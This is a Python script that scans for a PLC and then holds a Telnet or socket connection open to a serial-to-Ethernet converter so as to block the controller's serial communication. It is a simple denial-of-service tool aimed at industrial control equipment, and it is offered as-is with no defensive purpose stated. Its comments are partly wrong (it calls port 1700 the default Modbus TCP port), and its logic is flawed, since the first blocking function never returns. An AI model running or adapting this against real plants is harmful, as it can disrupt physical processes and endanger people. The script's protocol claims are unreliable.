import socket
import time
import telnetlib

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 1700))  # 1700 is the default port for Modbus TCP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to block serial COM
def block_serial_com():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the IP address and port of the serial to Ethernet converter
        converter_ip = '10.0.0.1'
        converter_port = 20001
        
        # Create a Telnet connection to the serial to Ethernet converter
        try:
            tn = telnetlib.Telnet(converter_ip, converter_port)
            print("Connected to the serial to Ethernet converter")
            # Keep the connection open to block the serial COM
            while True:
                time.sleep(1)
        except Exception as e:
            print("Failed to connect to the serial to Ethernet converter:", str(e))
    else:
        print("PLC IP address not found")

# Function to block serial COM using socket
def block_serial_com_socket():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the IP address and port of the serial to Ethernet converter
        converter_ip = '10.0.0.1'
        converter_port = 20001
        
        # Create a socket connection to the serial to Ethernet converter
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((converter_ip, converter_port))
            print("Connected to the serial to Ethernet converter")
            # Keep the connection open to block the serial COM
            while True:
                time.sleep(1)
        except Exception as e:
            print("Failed to connect to the serial to Ethernet converter:", str(e))
    else:
        print("PLC IP address not found")

# Main function to start the serial COM blocking
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Block serial COM using Telnet
        block_serial_com()
        
        # Block serial COM using socket
        block_serial_com_socket()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()